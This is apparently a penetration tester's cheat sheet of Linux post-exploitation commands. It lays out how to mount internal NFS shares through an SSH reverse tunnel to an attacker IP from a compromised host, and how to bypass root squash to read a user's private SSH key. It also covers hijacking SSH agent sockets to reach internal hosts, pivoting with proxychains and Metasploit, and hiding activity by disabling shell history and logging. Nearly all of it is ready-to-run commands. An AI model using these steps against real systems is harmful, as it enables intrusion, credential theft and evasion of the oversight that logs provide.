# Linux Post Methods

## NFS Proxy Mount

tags: nfs, proxy, proxychains, mount, reverse tunnle, ssh

### Mount internal NFS share through pivot

After compromising a host as a low-priv user, if the system has access to local NFS shares, the shares can be mounted via a proxy. One method is to create a SSH proxy and mount the NFS share on the remote attack box. In the easiest of cases, the below is all that is required.

```
# victim
ssh -R 2049:$target_nfs_ip:2049 proxyusr@$atk_ip
# attacker
mount -t nfs -o port=2049 localhost:/share /mnt
```

As NFS uses multiple ports for protocol communication, and can make use of TCP or UDP, if the mount command fails, it is likely due to the `mountport` being unknown on the attacking system. This can be resolved by feeding the mount command the port manually. Run the following on the victim system to identify the port. 

```
rpcinfo -p $victim_nfs
```

Where the `mountd` port is the `mountport`, it can be fed to the mount command.

```
mount -t nfs -o port=2049,mountport=1234 localhost:/share /mnt
```

One may need to set the `-o proto=tcp` to ensure TCP is used. Or, the  NFS version may need to be set manually, such as `-o vers=3` or `-o vers=4`.

### Rootsquash / Squashfs Bypass

Some versions of NFS can be configured so that even after a proxy mount, as the root user on the attacking system, not all files can be accessed. This is due to a root squash. One way to bypass this protection is to create a local user with a matching `uid`. 

For example, after mounting the `nfs:/home` directory locally, trying to reach the user folder for `jane` as the local root user does not work.

On the victim system, run:

`id -u jane`

Collect the `uid` of jane. On the attacking system, run:

```
useradd --uid 3755
su jane
cat /mnt/jane/.ssh/id_rsa
```

## Pivoting Methods

### Local Port Forwarding
* `ssh <gateway> -L <local port to listen>:<remote host>:<remote port>`

### Remote Port Forwarding
* `ssh <gateway> -R <remote port to bind>:<local host>:<local port>`

### Dynamic Port Forwarding
* `ssh -D <local proxy port> -p <remote port> <target>`

### Socket Hijack

From: https://twitter.com/REPTILEHAUS/status/1347103391961505792
Also: https://gist.github.com/int0x80/9e7b096684dd37c478198404d171aa3f

```
root@bastation: $ find /tmp/ssh-* -type s
/tmp/ssh-srQ6Q5UpOL/agent.1460

root@bastation: $ SSH_AUTH_SOCK=/tmp/ssh-srQ6Q5UpOL/agent.1460 ssh user@internal.company.tld

user@internal: $ hostname -f
internal.company.tld
```

### Proxychains
* First create a reverse tunnel from victim to attacker
    * `ssh -f -N -R 2222:127.0.0.1:22 root@208.68.234.100`
* Create dynamic application-level port forwarding on `8080`
    * `ssh -f -N -D 127.0.0.1:8080 -p 2222 hax0r@127.0.0.1`
* Configure proxychains to use port `8080` on attacking machine since the SSH
    process listening on that port will act as a SOCKS server
    * `proxychains nmap --top-ports=20 -sT -Pn 172.16.40.0/24`

### metasploit
* Add route to session
    * `route add 192.168.50.0 255.255.255.0 1`
* Setup proxy
    * `use auxiliary/server/socks4a`
    * `run`
* Select module (must be proxy aware)
    * `use auxiliary/scanner/ssh/ssh_login`
    * `set Proxies socks4:127.0.0.1:1050`

## THC

Nabbed from [The Hackers Choice](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)

* Hide Commands

```
$ export HISTFILE=/dev/null
```

* Commit Suicide 

```
#alias exit='kill -9 $$'```
```

* Commands starting with a space will not get logged to history

```
$  id
```

* Almost invisible SSH

```
$ ssh -o UserKnownHostsFile=/dev/null -T user@server.org "bash -i"
```